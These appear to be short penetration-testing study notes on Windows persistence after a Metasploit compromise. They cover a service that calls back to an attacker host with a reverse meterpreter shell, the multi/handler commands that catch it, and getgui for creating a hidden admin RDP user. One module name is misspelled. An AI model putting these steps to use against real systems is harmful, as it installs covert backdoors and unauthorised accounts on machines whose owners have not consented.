![](</Images/Pasted image 20240106152027.png>)


## Persistence via Services

metasploit/meterpreter version. After getting meterpreter shell, background
 search platform:windows persistence. Below is best option. Needs admin access to run
```
exploit/windows/local/persitance_services
```

- set a service name if applicable
- session (running meterpreter session)\

By default will use:
>Payload: windows/meterpreter/reverse_tcp
>LHOST: Attack IP Address
>LPORT: 4444 <-change port

Then to regain access. Must match settings from original exploit
>msfconsole -q 
>use exploit/multi/handler
>set LHOST 10.10.1.2 
>set PAYLOAD windows/meterpreter/reverse_tcp 
>set  LPORT 4444 exploit <- update port

## Persistence via RDP

First gain admin access.
From meterpreter run `run getgui -e -u <new user> -p <password>`
> cheks RDP is enabled and will enable if not, create user, hide user, and add user to admin group and RDP group
>user xfreerdp to login